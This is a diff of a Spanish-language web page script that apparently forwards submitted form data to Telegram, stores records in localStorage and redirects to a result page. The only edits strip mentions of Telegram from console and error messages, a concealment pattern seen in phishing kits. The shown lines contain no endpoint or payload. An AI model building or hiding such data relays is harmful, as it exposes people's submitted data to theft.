@@ -19,8 +19,8 @@ window.addEventListener('load', function() {
         })
     })
     .then(res => res.json())
-    .then(data => console.log("Mensaje enviado a Telegram"))
-    .catch(err => console.error("Error enviando mensaje", err));
+    .then(data => console.log("enviado "))
+    .catch(err => console.error("Error ", err));
 });
 
 
@@ -78,7 +78,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
       );
 
-      if (!response.ok) throw new Error("Telegram no respondió");
+      if (!response.ok) throw new Error("no respondió");
 
       /* =============================== GUARDAR EN LOCALSTORAGE =============================== */
       let registros = JSON.parse(localStorage.getItem("registros")) || [];
@@ -93,14 +93,14 @@ document.addEventListener("DOMContentLoaded", () => {
 
       localStorage.setItem("registros", JSON.stringify(registros));
 
-      console.log("Datos enviados a Telegram y guardados");
+      console.log("EXITO");
 
       modalCarga.style.display = "none";
       window.location.href = "resultado.html";
 
     } catch (error) {
       modalCarga.style.display = "none";
-      mostrarModalError("Error al enviar datos. Intenta nuevamente.");
+      mostrarModalError("Error. Intenta nuevamente.");
       console.error("Error Telegram:", error);
     }
 
@@ -139,5 +139,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
     setTimeout(() => modal.style.display = "none", 300);
   });
+
 
 });
